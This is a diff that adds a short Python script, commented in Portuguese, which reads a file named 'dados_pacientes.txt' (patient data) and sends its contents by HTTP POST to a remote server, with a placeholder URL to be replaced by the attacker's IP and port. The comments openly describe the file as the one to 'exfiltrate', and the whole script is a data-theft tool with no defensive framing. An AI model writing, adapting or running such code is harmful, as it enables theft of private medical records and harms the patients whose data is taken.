@@ -1,0 +1,27 @@
+pip install requests
+
+import requests
+
+# Definir o caminho para o arquivo que você deseja exfiltrar, mas se o arquivo de exfiltração estiver no mesmo deretório que o arquivo a ser exfiltrado, pode deixar como está.
+file_path = 'dados_pacientes.txt'
+
+# Definir o URL do servidor para onde os dados serão enviados o IP:Port
+server_url = 'http://example.com/receive_data'
+
+# Leia o conteúdo do arquivo
+try:
+    with open(file_path, 'r') as file:
+        file_content = file.read()
+except Exception as e:
+    print(f"Erro ao ler o arquivo: {e}")
+    exit()
+
+# Envie o conteúdo do arquivo para o servidor remoto
+try:
+    response = requests.post(server_url, data={'file_content': file_content})
+    if response.status_code == 200:
+        print("Dados enviados com sucesso!")
+    else:
+        print(f"Falha ao enviar dados. Status code: {response.status_code}")
+except Exception as e:
+    print(f"Erro ao enviar os dados: {e}")
